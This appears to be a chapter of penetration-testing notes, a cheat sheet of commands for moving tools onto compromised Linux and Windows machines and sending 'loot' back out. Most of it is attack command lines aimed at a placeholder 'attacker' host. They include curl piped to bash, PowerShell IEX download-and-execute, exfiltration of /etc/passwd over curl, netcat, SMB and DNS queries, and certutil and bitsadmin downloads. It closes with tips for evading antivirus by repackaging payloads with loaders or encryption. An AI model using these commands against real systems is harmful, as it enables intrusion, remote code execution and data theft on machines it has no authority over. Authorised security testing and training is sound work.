# 13 — File Transfers

Getting binaries, loot, and tools across the wire in both directions, on Linux and Windows targets.

## Contents

- [Quick HTTP server (attacker side)](#quick-http-server-attacker-side)
- [Linux target — pull files](#linux-target-pull-files)
- [Linux target — push files (exfil)](#linux-target-push-files-exfil)
- [Windows target — pull files (PowerShell)](#windows-target-pull-files-powershell)
- [Windows target — pull files (cmd / LOLBAS)](#windows-target-pull-files-cmd-lolbas)
- [Windows target — push files](#windows-target-push-files)
- [SMB transfer (tool-agnostic)](#smb-transfer-tool-agnostic)
- [FTP transfer](#ftp-transfer)
- [SCP / SSH](#scp-ssh)
- [Encoding-only transfer (clipboard / restricted shell)](#encoding-only-transfer-clipboard-restricted-shell)
- [Hex pasting (last resort)](#hex-pasting-last-resort)
- [DNS exfiltration (heavily filtered networks)](#dns-exfiltration-heavily-filtered-networks)
- [Integrity & antivirus tips](#integrity-antivirus-tips)
- [Sources](#sources)

## Quick HTTP server (attacker side)

```bash
# Python (works almost everywhere)
python3 -m http.server 80
python3 -m http.server 8000 --bind 127.0.0.1
python3 -m http.server 80 --directory /tmp/loot

# Upload-capable: uploadserver
pip install uploadserver
python3 -m uploadserver 80                  # POST to /upload

# PHP one-liner
php -S 0.0.0.0:80

# Ruby one-liner
ruby -run -e httpd . -p 80

# Twisted
twistd -n web --path .

# Updog (auth + upload)
updog -d /tmp/loot -p 80
```

## Linux target — pull files

```bash
wget http://attacker/file -O /tmp/file
curl -o /tmp/file http://attacker/file
curl -fsSL http://attacker/x.sh | bash             # pipe-to-shell

# Restricted environments
exec 3<>/dev/tcp/attacker/80; printf 'GET /f HTTP/1.0\r\n\r\n' >&3; cat <&3 > /tmp/f
# strip headers (everything until blank line)
```

If `wget`/`curl` are absent:

```bash
# Bash /dev/tcp
cat < /dev/tcp/attacker/4444 > /tmp/file       # paired with `nc -lp 4444 < file` on attacker

# Python
python3 -c "import urllib.request as u; u.urlretrieve('http://attacker/f','/tmp/f')"

# Perl
perl -e 'use LWP::Simple; getstore("http://attacker/f","/tmp/f")'
```

## Linux target — push files (exfil)

```bash
curl -F 'file=@/etc/passwd' http://attacker/upload
curl --upload-file /etc/passwd http://attacker/passwd
nc attacker 4444 < /etc/passwd                  # `nc -lp 4444 > out` on attacker
scp /etc/passwd user@attacker:/loot/
rsync -av /etc/ user@attacker:/loot/etc/
```

## Windows target — pull files (PowerShell)

```powershell
# Save to disk
(New-Object Net.WebClient).DownloadFile('http://attacker/f.exe','C:\Temp\f.exe')
Invoke-WebRequest http://attacker/f.exe -OutFile C:\Temp\f.exe -UseBasicParsing
iwr -Uri http://attacker/f.exe -OutFile C:\Temp\f.exe -UseBasicParsing
Start-BitsTransfer -Source http://attacker/f.exe -Destination C:\Temp\f.exe

# In-memory (no disk write)
IEX (New-Object Net.WebClient).DownloadString('http://attacker/x.ps1')
iwr http://attacker/x.ps1 -UseBasicParsing | iex

# Through an SMB share (no HTTP needed)
copy \\attacker\share\f.exe C:\Temp\f.exe
```

## Windows target — pull files (cmd / LOLBAS)

```cmd
:: certutil
certutil.exe -urlcache -split -f http://attacker/f.exe C:\Temp\f.exe
certutil.exe -urlcache -split -f http://attacker/f.exe C:\Temp\f.exe delete

:: bitsadmin
bitsadmin /transfer myJob /download /priority high http://attacker/f.exe C:\Temp\f.exe

:: Other LOLBAS download primitives (situational)
findstr /V "X" \\attacker\share\f.exe > C:\Temp\f.exe
xcopy \\attacker\share\f.exe C:\Temp\
```

LOLBAS catalog: https://lolbas-project.github.io/

## Windows target — push files

```powershell
# Upload to a netcat listener
$bytes = [IO.File]::ReadAllBytes('C:\Temp\f.bin')
$tcp = New-Object Net.Sockets.TcpClient('attacker', 4444)
$ns  = $tcp.GetStream(); $ns.Write($bytes, 0, $bytes.Length); $tcp.Close()

# Upload via Invoke-WebRequest to uploadserver
$f = 'C:\Temp\loot.zip'
$boundary = [System.Guid]::NewGuid().ToString()
$headers = @{ 'Content-Type' = "multipart/form-data; boundary=$boundary" }
# (full multipart body construction)
Invoke-RestMethod -Uri http://attacker/upload -Method Post -Headers $headers -InFile $f

# Easiest: SMB share with write
net use Z: \\attacker\share /user:none ''
copy C:\Temp\loot.zip Z:\
```

Spin a writable SMB share on attacker:

```bash
impacket-smbserver share /tmp/share -smb2support
impacket-smbserver share /tmp/share -smb2support -username u -password p   # auth
```

## SMB transfer (tool-agnostic)

```bash
# Attacker
impacket-smbserver share /tmp/share -smb2support
```

```cmd
:: Target (Windows)
copy \\<ATTACKER-IP>\share\f.exe C:\Temp\
copy C:\loot.zip \\<ATTACKER-IP>\share\

:: Or mount
net use Z: \\<ATTACKER-IP>\share
```

```bash
# Target (Linux) — needs cifs-utils
mount -t cifs //<ATTACKER-IP>/share /mnt/x -o user=guest,password=
```

## FTP transfer

```bash
# Attacker
sudo python3 -m pyftpdlib -p 21 -w        # anon write
```

```cmd
:: Target (Windows) - scripted FTP
echo open ATTACKER  > ftp.txt
echo USER anonymous>> ftp.txt
echo bin            >> ftp.txt
echo GET f.exe      >> ftp.txt
echo bye            >> ftp.txt
ftp -n -s:ftp.txt
```

## SCP / SSH

```bash
scp file.txt user@target:/tmp/
scp -P 2222 user@target:/etc/passwd ./loot/
ssh user@target 'cat /etc/passwd' > passwd

# tar over SSH (great for whole directories with perms)
tar cf - /etc | ssh user@attacker 'tar xf - -C /loot/'
```

## Encoding-only transfer (clipboard / restricted shell)

When you can only paste text, no networking:

```bash
# Encode on attacker
base64 -w0 file.bin > file.b64

# Paste into target shell, then:
echo "<paste>" | base64 -d > /tmp/file.bin

# Linux base64 wraps lines by default; use `base64 -d` on the target, but
# strip whitespace if needed:
tr -d ' \n\t' <<< "<paste>" | base64 -d > /tmp/file.bin
```

```powershell
# Windows
$b = '<paste>'
[IO.File]::WriteAllBytes('C:\Temp\file.bin', [Convert]::FromBase64String($b))
```

```cmd
:: certutil decodes too (handy in cmd-only contexts)
certutil -decode in.b64 out.bin
certutil -encode in.bin out.b64
```

## Hex pasting (last resort)

```bash
# Attacker: produce hex
xxd -p file.bin > file.hex
```

```bash
# Target
xxd -r -p file.hex > file.bin
```

PowerShell:

```powershell
$h = '<hex string with no spaces>'
$bytes = for ($i=0; $i -lt $h.Length; $i+=2) { [Convert]::ToByte($h.Substring($i,2),16) }
[IO.File]::WriteAllBytes('C:\Temp\file.bin', [byte[]]$bytes)
```

## DNS exfiltration (heavily filtered networks)

```bash
# Burst-encode the file, query DNS labels
xxd -p -c 30 secret.txt | while read chunk; do
  dig "$chunk.attacker.tld" @8.8.8.8 +short
done
```

Capture on attacker with a controlled NS (`tcpdump -i any port 53`).

Tools that automate this: `iodine`, `dnscat2`, Cobalt Strike DNS profile (in scope-appropriate engagements).

## Integrity & antivirus tips

- Always verify hash after transfer:
  ```bash
  sha256sum file        # Linux
  ```
  ```powershell
  Get-FileHash file -Algorithm SHA256
  certutil -hashfile file SHA256
  ```
- AV will flag known offensive binaries. Re-package with a loader, encrypt the payload, or use trusted-binary execution paths.
- Defender real-time scans `C:\Users\*\Downloads` and execution paths; staging in `C:\Temp\` or `C:\ProgramData\` is common but still scanned.
- AMSI inspects PowerShell content before execution — see [06 Windows CLI](06-introduction-to-windows-cli.md).

## Sources

- LOLBAS: https://lolbas-project.github.io/
- GTFOBins: https://gtfobins.github.io/
- Microsoft Learn (BITS, Invoke-WebRequest)
- Impacket: https://github.com/fortra/impacket
